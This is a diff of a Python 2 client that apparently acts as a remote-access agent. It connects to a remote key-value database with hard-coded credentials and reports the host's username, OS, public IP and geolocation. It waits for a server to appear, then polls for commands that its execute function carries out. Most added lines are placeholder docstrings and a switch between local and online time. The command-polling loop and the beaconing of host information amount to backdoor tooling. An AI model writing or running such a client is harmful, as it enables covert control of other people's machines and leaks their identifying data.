@@ -12,23 +12,70 @@ import pytz
 
 sys.path.insert(0,'..')
 from my_plugins.kvdb.openkv import OpenKV
-
+from my_plugins.unitime import getOnlineUTCTime
+from others.kvids import KVID
 from colorama import init, AnsiToWin32, Fore, Style
+
+"""
+To support color display in all platforms, like linux, mac osx, windows, and etc.
+
+We use different approaches to deal with the color display in windows and non-windows
+
+operating systems.
+
+"""
 init(wrap=False)
 stream = AnsiToWin32(sys.stderr).stream
-win_sys = False
-
+win_sys = False # determine whether current os is windows.
 if platform.startswith('win'):
     win_sys = True
 
+"""
+If you cannot connect the server, you can tune with the online_time parameter.
+
+When online_time is set to True, the time will be grabbed from a website, which
+
+means you may need to check the accessibility of this website in your browswer
+
+mannually.
+
+"""
+online_time = True
+
+
+"""
+This dictionary is used for better operating system display.
+
+"""
 platform_dict = {'linux2': "Linux",'win32':"Windows",'cygwin':"Windows/Cygwin",'darwin':"Mac OS X",'os2':"OS/2",'os2emx':"OS/2 EMX",'riscos':"RiscOS",'atheos':"AtheOS"}
-USER,PASS = "rock","112233"
+
+
+"""
+This is the access information of your current kv database.
+
+We strongly suggest you to replace the original value with yours for safety and efficiency concerns.
+
+"""
+USER,PASS = "user1","112233"
+
+
+"""
+These parameters are special features of the client.
+
+For more information, please read the doc.
+
+"""
 username = str(getpass.getuser())
 last_server_time = None
 server_persistent_time = 60 * 30 # 0.5 hour
 last_command_arrival_time = None
 client_info = {}
 
+
+"""
+TODO: function or class specification
+
+"""
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -40,13 +87,21 @@ class bcolors:
     UNDERLINE = '\033[4m'
     
 
+"""
+TODO: function or class specification
 
+"""
 def os_information():
     global platform_dict
     if platform in platform_dict.keys():
         return platform_dict[platform]
     return platform
 
+
+"""
+TODO: function or class specification
+
+"""
 def geo_information():
     try:
         send_url = 'http://freegeoip.net/json'
@@ -57,6 +112,10 @@ def geo_information():
         return None
 
 
+"""
+TODO: function or class specification
+
+"""
 def latest_val_of(kv,key,time=False):
     global USER,PASS
     if not time:
@@ -71,9 +130,20 @@ def latest_val_of(kv,key,time=False):
         except:
             return None,None
 
+
+"""
+TODO: function or class specification
+
+"""
 def change_dir(dir):
     os.chdir(dir)
 
+
+
+"""
+TODO: function or class specification
+
+"""
 def str_to_time(time_str):
     main,minor = time_str.split()
     year,month,day, = main.strip().split('-')
@@ -82,6 +152,10 @@ def str_to_time(time_str):
     return datetime.datetime(*time_list)
 
 
+"""
+TODO: function or class specification
+
+"""
 def get_open_ip():
     try:
         ip = urlopen('http://ip.42.pl/raw').read()
@@ -90,18 +164,25 @@ def get_open_ip():
     return ip
 
 
-def init_connection():
+"""
+TODO: function or class specification
+
+"""
+def init_connection(base_id):
     if not win_sys:
         print bcolors.BOLD + bcolors.OKGREEN + "[+]Initiating Remote Connection" + bcolors.ENDC + bcolors.ENDC
     else:
         print >>stream, Fore.LIGHTGREEN_EX + "[+]Initiating Remote Connection" + Style.RESET_ALL
     kv = OpenKV()
-    kv_id = '4K5gyNGZ'
-    kv.setDB(kv_id)
+    kv.setDB(base_id)
 
     return kv
 
 
+"""
+TODO: function or class specification
+
+"""
 def round_bin_check(kv):
     global last_server_time
     global server_persistent_time
@@ -127,8 +208,11 @@ def round_bin_check(kv):
             if last_server_time != init_time:
                 # timestamp is updated
                 last_server_time = init_time
-                tz = pytz.timezone('Asia/Shanghai')
-                now = datetime.datetime.now(tz)
+                if not online_time:
+                    tz = pytz.timezone('Asia/Shanghai')
+                    now = datetime.datetime.now(tz)
+                else:
+                    now = getOnlineUTCTime()
                 now = now.replace(tzinfo=None)
                 time_params = last_server_time.split('-')
                 time_params = [int(v) for v in time_params]
@@ -157,6 +241,10 @@ def round_bin_check(kv):
         print >>stream, Fore.LIGHTGREEN_EX + '[+]Server found (initiated before ' + str(time_theta.seconds) + " seconds)" + Style.RESET_ALL
 
 
+"""
+TODO: function or class specification
+
+"""
 def send_basic_information(kv):
     global client_info
     content = {}
@@ -181,6 +269,11 @@ def send_basic_information(kv):
         sleep_time = random.randint(1,10)
         time.sleep(sleep_time)
 
+
+"""
+TODO: function or class specification
+
+"""
 def execute(kv):
     global last_command_arrival_time
     global username
@@ -197,10 +290,14 @@ def execute(kv):
                 if update_time != last_command_arrival_time:
                     last_command_arrival_time = update_time
                     arrival_time = str_to_time(last_command_arrival_time)
-                    tz = pytz.timezone('Asia/Shanghai')
-                    now = datetime.datetime.now(tz)
+                    if not online_time:
+                        tz = pytz.timezone('Asia/Shanghai')
+                        now = datetime.datetime.now(tz)
+                    else:
+                        now = getOnlineUTCTime()
                     now = now.replace(tzinfo=None)
                     time_theta = now - arrival_time
+                    print 'time_theta:',time_theta
                     if time_theta.seconds <= 20:
                         # we practically think the command should be in 20 seconds
                         break
@@ -270,8 +367,12 @@ def execute(kv):
                 print >>stream, Fore.LIGHTRED_EX + '[-]Not sent. Retrying...' + Style.RESET_ALL
 
 
+"""
+This is the program entry.
+
+"""
 if __name__ == "__main__":
-    db = init_connection()
+    db = init_connection(KVID.DEFAULT)
     round_bin_check(db)
     send_basic_information(db)
     execute(db)
